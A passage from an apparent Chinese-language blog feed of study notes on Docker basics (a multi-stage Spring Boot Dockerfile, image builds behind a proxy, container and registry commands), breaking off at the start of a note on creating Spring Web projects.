class="language-bash"> pom.xml /app                <span class="hljs-comment"># 或者直接写 .</span></span><br><br><br><span class="hljs-comment"># 下载 pom.xml 中所指定的项目的所有依赖（包括插件等），-B 参数是指批处理模式（非交互式）</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> mvn dependency:go-offline -B</span><br><br><br><span class="hljs-comment"># 将 DockerFile 所在目录中项目的源代码 src 文件复制到容器内的 /app/src 目录。</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> src /app/src                <span class="hljs-comment"># 或者直接写 ./src</span></span><br><br><br><span class="hljs-comment"># 运行 mvn package 命令，构建项目并生成 JAR 包。-DskipTests 表示跳过单元测试的执行</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> mvn package -DskipTests</span><br><br><br><br><br><br><span class="hljs-comment"># 生产阶段</span><br><br><span class="hljs-comment"># eclipse-temurin:17-jre-alpine，是一个轻量级的 JRE 镜像，适合运行 Java 应用程序。</span><br><span class="hljs-keyword">FROM</span> eclipse-temurin:<span class="hljs-number">17</span>-jre-alpine<br><br><br><span class="hljs-comment"># 设置元数据</span><br><span class="hljs-keyword">LABEL</span><span class="language-bash"> maintainer=<span class="hljs-string">&quot;dev@example.com&quot;</span></span><br><span class="hljs-keyword">LABEL</span><span class="language-bash"> version=<span class="hljs-string">&quot;1.0&quot;</span></span><br><br><br><span class="hljs-comment"># 创建 springboot 用户（非 root 用户，Docker 安全相关知识）</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> addgroup -S springboot &amp;&amp; adduser -S springboot -G springboot</span><br><br><br><span class="hljs-comment"># 设置工作目录</span><br><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /app</span><br><br><br><span class="hljs-comment"># 从 builder 阶段复制 JAR 文件（注意 JAR 名称需与 pom.xml 中配置一致）</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> --from=builder /app/target/*.jar app.jar</span><br><br><br><span class="hljs-comment"># 更改 /app 目录及其中所有文件的拥有者为 springboot 用户和组</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chown</span> -R springboot:springboot /app</span><br><br><br><span class="hljs-comment"># 切换到 springboot 用户运行后续命令，避免以 root 用户执行。</span><br><span class="hljs-keyword">USER</span> springboot<br><br><br><span class="hljs-comment"># 声明容器将监听的端口。Spring Boot 默认在 8080 端口提供服务，因此这里暴露了 8080 端口。</span><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">8080</span><br><br><span class="hljs-comment"># 健康检查（Docker 安全相关知识）</span><br><span class="hljs-keyword">HEALTHCHECK</span><span class="language-bash"> --interval=30s --<span class="hljs-built_in">timeout</span>=3s \</span><br><span class="language-bash">  CMD wget -q -O /dev/null http://localhost:8080/actuator/health || <span class="hljs-built_in">exit</span> 1</span><br><br><br><span class="hljs-comment"># 启动命令，-Dspring.profiles.active=prod 是 Boot 运行的相关参数，指定是在生产环境</span><br><span class="hljs-keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="hljs-string">&quot;java&quot;</span>, <span class="hljs-string">&quot;-jar&quot;</span>, <span class="hljs-string">&quot;-Dspring.profiles.active=prod&quot;</span>, <span class="hljs-string">&quot;app.jar&quot;</span>]</span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项：为什么不直接在项目中打包 JAR 文件，而要在 Docker 中构建？</p><ol><li>确实可以在本地环境中直接进行构建和打包，但在 <strong>Docker</strong> 中构建项目有其独特的优势。</li><li>Docker 提供了一个一致的运行环境，通过在 Docker 中构建应用，可以确保构建环境与生产环境完全一致，避免由于不同开发机器上的环境差异（如 JDK 版本、依赖版本等）带来的问题，不会受到宿主机上已安装工具或库的影响。</li></ol></blockquote><blockquote><p>[!NOTE] 注意事项：<code>RUN mvn package -DskipTests</code> 命令</p><ol><li>默认情况下，当你执行 <code>mvn package</code> 时，Maven 只会将项目编译后的 <code>.class</code> 文件和 <code>resources</code> 文件打包进生成的 JAR 文件。外部依赖（如 Spring Boot、第三方库等）不会自动被打包进 JAR 文件，所以，打出来的 JAR 文件无法独立运行，除非目标机器也具备所需依赖。</li><li>如果希望在没有外部依赖环境的情况下运行应用，就需要将所有外部依赖一起打包进 JAR 文件中，这样生成的 JAR 就可以独立运行，无需额外配置依赖。这时，我们需要在 <code>pom.xml</code> 中配置相应的插件来进行这一实现：<ul><li><code>spring-boot-maven-plugin</code>（适用于 Spring Boot 项目）</li><li><code>maven-shade-plugin</code>（适用于任何 Java 项目）</li></ul></li></ol></blockquote><p>&#x3D;&#x3D;3.将项目代码复制到 &#x2F;etc&#x2F;temp&#x3D;&#x3D;<br>大致结构可能为：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs 1c">/etc/temp<br><span class="hljs-string">|</span><br><span class="hljs-string">|-- Dockerfile</span><br><span class="hljs-string">|</span><br><span class="hljs-string">|-- src /</span><br><span class="hljs-string">|</span><br><span class="hljs-string">|-- pom.xml</span><br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;5.使用 Docker File 构建镜像&#x3D;&#x3D;</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-comment"># 1. 模版</span><br>docker build \<br>  --build-arg http_proxy=<span class="hljs-symbol">http:</span>//&lt;代理<span class="hljs-title class_">IP</span>&gt;<span class="hljs-symbol">:&lt;</span>端口&gt; \<br>  --build-arg https_proxy=<span class="hljs-symbol">http:</span>//&lt;代理<span class="hljs-title class_">IP</span>&gt;<span class="hljs-symbol">:&lt;</span>端口&gt; \<br>  -t &lt;your-image-name&gt;<span class="hljs-symbol">:&lt;your-image-tag&gt;</span> .<br>  <br><br><span class="hljs-comment"># 2. 以太网</span><br>docker build \<br>  --build-arg http_proxy=<span class="hljs-symbol">http:</span>//<span class="hljs-number">172.20</span>.<span class="hljs-number">10.3</span><span class="hljs-symbol">:</span><span class="hljs-number">7890</span> \<br>  --build-arg https_proxy=<span class="hljs-symbol">http:</span>//<span class="hljs-number">172.20</span>.<span class="hljs-number">10.3</span><span class="hljs-symbol">:</span><span class="hljs-number">7890</span> \<br>  -t &lt;your-image-name&gt;<span class="hljs-symbol">:&lt;your-image-tag&gt;</span> .<br><br><br><span class="hljs-comment"># 3. 局域网</span><br>docker build \<br>  --build-arg http_proxy=<span class="hljs-symbol">http:</span>//<span class="hljs-number">182.32</span>.<span class="hljs-number">38.66</span><span class="hljs-symbol">:</span><span class="hljs-number">7890</span> \<br>  --build-arg https_proxy=<span class="hljs-symbol">http:</span>//<span class="hljs-number">182.32</span>.<span class="hljs-number">38.66</span><span class="hljs-symbol">:</span><span class="hljs-number">7890</span> \<br>  -t &lt;your-image-name&gt;<span class="hljs-symbol">:&lt;your-image-tag&gt;</span> .<br></code></pre></td></tr></table></figure><ol><li>&#x3D;&#x3D;-t your-image-name:your-image-tag&#x3D;&#x3D;<ol><li>你的镜像名称和标签，例如： my-spring-app:v1.0</li></ol></li><li>&#x3D;&#x3D;(.)&#x3D;&#x3D;<ol><li>Dockerfile 的位置，这里表示当前目录，即 Dockerfile 在当前目录</li></ol></li></ol><hr><h5 id="5-3-3-第三方自动构建-Docker-镜像"><a href="#5-3-3-第三方自动构建-Docker-镜像" class="headerlink" title="5.3.3. 第三方自动构建 Docker 镜像"></a>5.3.3. 第三方自动构建 Docker 镜像</h5><p>以下是基于 阿里云容器镜像服务 +  GitHub 自动构建 Docker 镜像的全过程，能够当代码提交到 GitHub 仓库后，自动构建镜像：</p><p>&#x3D;&#x3D;1.创建 GitHub 项目&#x3D;&#x3D;<br>创建一个空的 GitHub 仓库</p><p>&#x3D;&#x3D;2.推送代码&#x3D;&#x3D;<br>然后将我们的代码推送到该仓库中。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-meta"># 1. 初始化本地 Git 仓库</span><br>git <span class="hljs-keyword">init</span><br><br><br><span class="hljs-meta"># 2. 创建 README 文档</span><br>echo <span class="hljs-string">&quot;# automotic&quot;</span> &gt; README.md<br><br><br><span class="hljs-meta"># 3. 将 README 稳定添加到缓冲取</span><br>git <span class="hljs-keyword">add</span> README.md<br><br><br><span class="hljs-meta"># 4. 进行第一次推送（务必进行，相当于点火器）</span><br>git commit -m <span class="hljs-string">&quot;first commit&quot;</span><br><br><br><span class="hljs-meta"># 5. 将当前分支强制重命名为 main</span><br>git branch -M main<br><br><br><span class="hljs-meta"># 6. 本地仓库与远程仓库进行关联。</span><br>git remote <span class="hljs-keyword">add</span> origin https:<span class="hljs-comment">//github.com/wangjia5289/xxxxxx.git</span><br><br><br><span class="hljs-meta"># 7. 进行分支关联（使用 -u 选项，将本地 main 分支与远程 main 分支关联，之后可以直接使用 git push 和 git pull，而无需每次指定远程仓库和分支。）</span><br>git push -u origin main<br><br><br><span class="hljs-meta"># 8. 后续推送</span><br>我们可以通过命令行或使用 GitHub Desktop 等工具来推送代码。<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;3.创建并编辑 Docker File&#x3D;&#x3D;<br>在 GitHub 项目根目录下创建 <code>Dockerfile</code> 文件，内容根据需求自定义</p><p>&#x3D;&#x3D;4.阿里云创建镜像仓库&#x3D;&#x3D;<br>在创建镜像仓库时，将其与我们之前创建的 GitHub 仓库进行关联。<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9ADocker%20%E5%9F%BA%E7%A1%80/image-20250406135036107.png"></p><p>&#x3D;&#x3D;5.添加构建规则&#x3D;&#x3D;<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9ADocker%20%E5%9F%BA%E7%A1%80/image-20250406140638445.png"></p><p>&#x3D;&#x3D;6.编辑构建规则&#x3D;&#x3D;<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9ADocker%20%E5%9F%BA%E7%A1%80/image-20250406140437388.png"></p><h3 id="6-Docker-Container（容器）"><a href="#6-Docker-Container（容器）" class="headerlink" title="6. Docker Container（容器）"></a>6. Docker Container（容器）</h3><h4 id="6-1-Docker-Container-概述"><a href="#6-1-Docker-Container-概述" class="headerlink" title="6.1. Docker Container 概述"></a>6.1. Docker Container 概述</h4><p>Docker Container 就是从镜像启动的“运行实例”，它是一个独立的小盒子，应用就在里面跑，可以理解为一个大 Linux 系统中的小 Linux 系统。容器可以随时启动、停止、销 毁，互不干扰。</p><p><font color="#ff0000">Docker 官方推荐一个容器运行一个程序</font>，这样可以保持容器的简单性和高效性<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9ADocker%20%E5%9F%BA%E7%A1%80/image-20250313103856946.png"></p><hr><h4 id="6-2-Docker-Container-命令"><a href="#6-2-Docker-Container-命令" class="headerlink" title="6.2. Docker Container 命令"></a>6.2. Docker Container 命令</h4><p>&#x3D;&#x3D;1.查看容器&#x3D;&#x3D;</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-comment"># 1. 查看运行中的容器</span><br>docker ps<br>docker ps <span class="hljs-operator">-</span>-format <span class="hljs-string">&quot;table &#123;&#123;.Names&#125;&#125;<span class="hljs-char escape_">\t</span>&#123;&#123;.Image&#125;&#125;<span class="hljs-char escape_">\t</span>&#123;&#123;.Ports&#125;&#125;&quot;</span><br><br><span class="hljs-comment"># 2. 查看所有容器，包括已停止的容器</span><br>docker ps <span class="hljs-operator">-</span>a<br><br><br><span class="hljs-comment"># 3. 查看所有容器，并只打印 IMAGE ID（常用于一键删除所有容器）</span><br>docker ps <span class="hljs-operator">-</span>a <span class="hljs-operator">-</span>q<br><br><br><span class="hljs-comment"># 4. 查看容器详细信息</span><br>docker inspect <span class="hljs-symbol">&lt;container-id&gt;</span> <span class="hljs-symbol">/</span> <span class="hljs-symbol">&lt;container-name&gt;</span> <br><br><br><span class="hljs-comment"># 5. 查看容器日志</span><br>docker logs <span class="hljs-symbol">&lt;container-id&gt;</span> <span class="hljs-symbol">/</span> <span class="hljs-symbol">&lt;container-name&gt;</span> <br></code></pre></td></tr></table></figure><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9ADocker%20%E5%9F%BA%E7%A1%80/image-20250313104542342.png"></p><ol><li>&#x3D;&#x3D;CONTAINER ID&#x3D;&#x3D;：<ol><li>容器的唯一 ID（截断版，前12位，后续引用时可简写，只要能唯一区分）</li></ol></li><li>&#x3D;&#x3D;IMAGE&#x3D;&#x3D;：<ol><li>容器所基于的镜像名称</li></ol></li><li>&#x3D;&#x3D;COMMAND&#x3D;&#x3D;：<ol><li>启动容器时执行的命令（截断显示）</li></ol></li><li>&#x3D;&#x3D;CREATED&#x3D;&#x3D;：<ol><li>容器创建的时间</li></ol></li><li>&#x3D;&#x3D;STATUS&#x3D;&#x3D;：容器的当前状态。<ol><li><font color="#00b0f0">Up</font>：容器正在运行，<code>Up 2 hours</code> 代表已运行 2小时</li><li><font color="#00b0f0">Exited</font>：容器已停止</li><li><font color="#00b0f0">Restarting</font>：容器正在重启</li><li><font color="#00b0f0">Paused</font>：容器已暂停</li><li><font color="#00b0f0">Created</font>：容器已创建但未启动</li></ol></li><li>&#x3D;&#x3D;PORTS&#x3D;&#x3D;：<ol><li>容器端口映射，<code>80/tcp</code> 代表容器暴露了 80 端口，使用的是 TCP 协议</li></ol></li><li>&#x3D;&#x3D;NAME&#x3D;&#x3D;：<ol><li>容器的名称（若未手动指定则自动生成）</li></ol></li></ol><hr><p>&#x3D;&#x3D;2.启动容器&#x3D;&#x3D;</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-comment"># 1. 启动一个新的容器</span><br>docker run <span class="hljs-operator">&lt;</span>选项<span class="hljs-operator">&gt;</span> <span class="hljs-symbol">&lt;image-name&gt;</span>:<span class="hljs-symbol">&lt;image-tag&gt;</span><br><br><br><span class="hljs-comment"># 2. 启动一个停止的容器</span><br>docker start <span class="hljs-symbol">&lt;container-id&gt;</span> <span class="hljs-symbol">/</span> <span class="hljs-symbol">&lt;container-name&gt;</span><br><br><br><span class="hljs-comment"># 3. 重启一个容器</span><br>docker restart <span class="hljs-symbol">&lt;container-id&gt;</span> <span class="hljs-symbol">/</span> <span class="hljs-symbol">&lt;container-name&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>如果宿主机（主机）关闭或重启，正在运行的 Docker 容器会自动停止。这是因为容器依赖宿主机的资源（如 CPU、内存等）运行。若希望容器在宿主机重启时自动启动，需要在启动容器时或修改容器的基本信息时配置 <code>--restart</code> 重启策略</li><li>当通过 <code>docker run</code> 启动一个新容器时，首先会在本地查找指定的镜像。如果镜像已存在，则直接启动容器。如果镜像不存在本地，则会从镜像中心（如 Docker Hub）查找。如果镜像中心存在该镜像，它会被下载到本地并启动容器；如果镜像中心也没有该镜像，则会报错。</li><li><code>docker run</code> 命令的常用选项：<ul><li><font color="#00b0f0">-d</font>：<ul><li>在后台启动容器并返回容器完整 ID，可以使用 <code>docker exec</code> 命令进入容器</li><li>该选项非常重要，否则容器只会在当前终端的前台运行，退出终端时容器会终止</li></ul></li><li><font color="#00b0f0">-p</font>：<ul><li>用于端口映射，如 <code>-p 8080:80</code>，将宿主机的 8080 端口映射到容器的 80 端口</li></ul></li><li><font color="#00b0f0">–name</font>：<ul><li>用于为容器指定名称，如 <code>--name mynginx</code>。如果不指定名称，容器将随机分配一个名称</li></ul></li><li><font color="#00b0f0">–restart</font><ul><li><font color="#7030a0">–restart unless-stopped</font>:<ul><li>容器会在 Docker 服务启动时自动启动，除非容器被手动停止（如 <code>docker stop</code>）。</li><li>手动停止后，容器不会自动重启，直到手动启动。</li></ul></li><li><font color="#7030a0">–restart always</font>:<ul><li>容器总是会在 Docker 服务启动时自动启动</li></ul></li></ul></li></ul></li></ol></blockquote><p>&#x3D;&#x3D;3.停止容器&#x3D;&#x3D;</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">docker <span class="hljs-selector-tag">stop</span> &lt;<span class="hljs-attribute">container</span>-id&gt; / &lt;<span class="hljs-attribute">container-name</span>&gt;<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;4.删除容器&#x3D;&#x3D;</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 1. 删除容器（需先停止容器）</span><br>docker <span class="hljs-built_in">rm</span> &lt;container<span class="hljs-literal">-id</span>&gt; / &lt;container<span class="hljs-literal">-name</span>&gt;<br><br><br><span class="hljs-comment"># 2. 强制删除容器（无需停止容器）</span><br>docker <span class="hljs-built_in">rm</span> <span class="hljs-operator">-f</span> &lt;container<span class="hljs-literal">-id</span>&gt; / &lt;container<span class="hljs-literal">-name</span>&gt;<br><br><br><span class="hljs-comment"># 3. 一键强制删除所有容器</span><br>docker <span class="hljs-built_in">rm</span> <span class="hljs-operator">-f</span> <span class="hljs-variable">$</span>(docker <span class="hljs-built_in">ps</span> <span class="hljs-literal">-aq</span>)<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>删除镜像是 <code>docker rmi</code> 命令，而删除容器是 <code>docker rm</code> 命令</li></ol></blockquote><p>&#x3D;&#x3D;4.更新容器&#x3D;&#x3D;</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 1. 修改容器的名称</span><br>docker rename my_old_container my_new_container<br><br><br><span class="hljs-comment"># 2. 修改容器的重启策略</span><br>docker update <span class="hljs-attribute">--restart</span>=unless-stopped my_container<br>docker update <span class="hljs-attribute">--restart</span>=always my_container<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>已创建的容器无法直接挂载数据卷或修改数据卷映射。如果有这种需求，可以基于原容器的配置重新创建一个容器，并在新容器中挂载所需的数据卷或数据卷映射。</li></ol></blockquote><p>&#x3D;&#x3D;5.进入 &#x2F; 退出容器&#x3D;&#x3D;</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 1. 进入容器，并以 bash 命令行交互模式（最常用）</span><br>docker exec -it &lt;container-id or name&gt; <span class="hljs-regexp">/bin/</span>bash<br><br><br><span class="hljs-comment"># 2. 退出容器</span><br><span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;6.容器与宿主机之间的文件拷贝&#x3D;&#x3D;</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 1. 宿主机文件拷贝到容器</span><br>docker cp <span class="hljs-regexp">/path/</span>on<span class="hljs-regexp">/host your-container-name:/</span>path<span class="hljs-regexp">/in/</span>container<br><br><span class="hljs-comment"># 2. 容器文件拷贝到宿主机</span><br>docker cp your-container-name:<span class="hljs-regexp">/path/i</span>n<span class="hljs-regexp">/container /</span>path<span class="hljs-regexp">/on/</span>host<br></code></pre></td></tr></table></figure><hr><h3 id="6-3-Docker-Registry（仓库）"><a href="#6-3-Docker-Registry（仓库）" class="headerlink" title="6.3. Docker Registry（仓库）"></a>6.3. Docker Registry（仓库）</h3><h5 id="6-3-1-Docker-Registry-概述"><a href="#6-3-1-Docker-Registry-概述" class="headerlink" title="6.3.1. Docker Registry 概述"></a>6.3.1. Docker Registry 概述</h5><p>Docker Registry 是用于存储和分发 Docker 镜像的仓库，允许开发者可以方便地分享和下载容器镜像</p><hr><h5 id="6-3-2-DockerHub"><a href="#6-3-2-DockerHub" class="headerlink" title="6.3.2. DockerHub"></a>6.3.2. DockerHub</h5><p><a href="https://hub.docker.com/">DockerHub</a> 是 Docker 官方出品的公共仓库，如果要像 DockerHub 上推送镜像或拉取私人镜像，可以使用以下步骤：</p><p>&#x3D;&#x3D;1.登录 DockerHub&#x3D;&#x3D;<br>在将镜像推送到 Docker Hub 前，必须先登录你的 Docker Hub 账户，登录成功后，你就拥有了在 Docker Hub 上执行诸如推送镜像的权限。</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker login</span><br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;2.给镜像重新打标签（Tag）&#x3D;&#x3D;</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">docker <span class="hljs-keyword">tag</span> <span class="hljs-title">mynginx</span>:latest leifengyang/mynginx:v1.<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><ol><li>&#x3D;&#x3D;docker tag&#x3D;&#x3D;：<ol><li>给已有的镜像打一个新的标签</li></ol></li><li>&#x3D;&#x3D;mynginx:latest&#x3D;&#x3D;：<ol><li>本地已有的镜像名和版本</li></ol></li><li>&#x3D;&#x3D;leifengyang&#x2F;mynginx:v1.0&#x3D;&#x3D;：<ol><li>Docker Hub 对镜像的命名有固定规范，格式为：<code>用户名/镜像名:版本号</code></li></ol></li></ol><blockquote><p>[!NOTE] 注意事项</p><ol><li>为什么需要重打标签？<ul><li>Docker Hub 要求镜像名称必须带有用户名前缀</li><li>如果直接推送本地镜像（如 <code>mynginx:latest</code>），由于缺少用户名前缀，Docker Hub 无法识别该镜像属于哪个用户或命名空间</li></ul></li><li>重打标签后，镜像的 ID 不变，说明什么？<ul><li>重打标签本质上只是为已有镜像创建一个新的“别名”，即使镜像拥有多个标签，它们本质上都指向同一个镜像实例，共享同一个镜像 ID</li></ul></li></ol></blockquote><p>&#x3D;&#x3D;3.推送镜像到 Docker Hub&#x3D;&#x3D;</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">docker</span> <span class="hljs-keyword">push</span> leifengyang/mynginx:<span class="hljs-built_in">v1</span>.<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;4.再推送一个最新版本的镜像&#x3D;&#x3D;</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">docker <span class="hljs-keyword">tag</span> <span class="hljs-title">mynginx</span>:latest leifengyang/mynginx:latest<br>docker push leifengyang/mynginx:latest<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项：为什么需要再推送一个最新版本的镜像？</p><ol><li><code>latest</code> 是 Docker 的一个惯例标签，通常表示某个镜像的最新稳定版本，使用者在拉取镜像时，如果没有指定版本标签，Docker 默认会拉取 <code>latest</code></li></ol></blockquote><hr><h5 id="6-3-3-阿里云容器-仓库"><a href="#6-3-3-阿里云容器-仓库" class="headerlink" title="6.3.3. 阿里云容器 仓库"></a>6.3.3. 阿里云容器 仓库</h5><p><a href="https://cr.console.aliyun.com/cn-hangzhou/instances">阿里云容器镜像服务</a>是阿里云提供的高效、可靠的镜像托管平台，具备镜像构建、安全扫描等实用功能。在国内访问速度较快，尤其适合已深度使用阿里云容器服务、弹性计算等云产品的企业。选择阿里云搭建私有镜像仓库，可以在集成性和管理便利性上获得显著优势。</p><p>具体使用步骤可以参考阿里云容器镜像服务 ACR，操作直观，无需过多说明。</p><p>需要注意的是，阿里云镜像仓库支持存储<strong>同一应用</strong>的<strong>多个版本镜像</strong>，而非多个应用。用户应根据业务需求按应用划分仓库，并通过标签管理不同版本的镜像。</p><hr><h3 id="补充：常用网站"><a href="#补充：常用网站" class="headerlink" title="补充：常用网站"></a>补充：常用网站</h3><ol><li>Docker Hub：<ol><li><a href="https://hub.docker.com/">https://hub.docker.com/</a></li></ol></li><li>Docker 官网：<ol><li><a href="https://www.docker.com/">https://www.docker.com/</a></li></ol></li></ol>]]></content>
    
    
    <categories>
      
      <category>容器化</category>
      
      <category>Docker</category>
      
      <category>Docker 基础</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：Java 项目创建和结构</title>
    <link href="/2025/03/12/%E7%AC%94%E8%AE%B0%EF%BC%9AJava%20%E9%A1%B9%E7%9B%AE%E5%88%9B%E5%BB%BA%E5%92%8C%E7%BB%93%E6%9E%84/"/>
    <url>/2025/03/12/%E7%AC%94%E8%AE%B0%EF%BC%9AJava%20%E9%A1%B9%E7%9B%AE%E5%88%9B%E5%BB%BA%E5%92%8C%E7%BB%93%E6%9E%84/</url>
    
    <content type="html"><![CDATA[<h2 id="Spring-Web-项目"><a href="#Spring-Web-项目" class="headerlink" title="Spring Web 项目"></a>Spring Web 项目</h2><h3 id="创建方式"><a href="#创建方式" class="headerlink" title="创建方式"></a>创建方式</h3><h4 id="4-2-使用-Spring-IDEA-提供的脚手架"><a href="#4-2-使用-Spring-IDEA-提供的脚手架" class="headerlink" title="4.2. 使用 Spring &#x2F; IDEA 提供的脚手架"></a>4.2. 使用 Spring &#x2F; IDEA 提供的脚手架</h4><p>使用 Spring 提供的脚手架 <a href="https://start.spring.io/">Spring Initializr</a> 创建项目，勾选</p><ol><li>Web<ol><li>Spring Web<br>下载并解压 ZIP 包，然后在 IntelliJ IDEA 中选择 <strong>Open</strong> 打开该项目。</li></ol></li></ol><blockquote><p>[!NOTE] 注意事项</p><ol><li>如果使用 IDEA 提供的脚手架，只需要在 IntelliJ IDEA 中创建项目即可。</li><li>脚手架默认使用最新版本进行创建。如果你想使用旧版本，可以在项目生成后手动修改 <code>spring-boot-starter-parent</code> 的版本，并重新加载项目。需要注意，Spring Boot 3 默认要求 JDK 17，因此你也需要根据实际情况调整 JDK 版本</li><li>Spring Boot 的历史版本可以在 Maven Central 仓库中查看：<a href="https://central.sonatype.com/artifact/org.springframework.boot/spring-boot/versions">Spring Boot 版本</a></li><li>补充：<code>Maven Central</code> 是依赖的官方仓库源，而 <code>mvnrepository.com</code> 则是一个提供依赖搜索与索引的第三方黄页工具站点</li></ol></blockquote><hr><h5 id="4-2-2-手动添加-Spring-Boot-依赖-继承-Parent"><a href="#4-2-2-手动添加-Spring-Boot-依赖-继承-Parent" class="headerlink" title="4.2.2. 手动添加 Spring Boot 依赖 (继承 Parent)"></a>4.2.2. 手动添加 Spring Boot 依赖 (继承 Parent)</h5><p>&#x3D;&#x3D;1.继承 spring-boot-starter-parent&#x3D;&#x3D;</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gherkin"><span class="hljs-comment"># 继承 spring-boot-starter-parent</span><br><span class="hljs-variable">&lt;parent&gt;</span>  <br>    <span class="hljs-variable">&lt;groupId&gt;</span>org.springframework.boot<span class="hljs-variable">&lt;/groupId&gt;</span>  <br>    <span class="hljs-variable">&lt;artifactId&gt;</span>spring-boot-starter-parent<span class="hljs-variable">&lt;/artifactId&gt;</span>  <br>    <span class="hljs-variable">&lt;version&gt;</span>3.4.1<span class="hljs-variable">&lt;/version&gt;</span>  <br><span 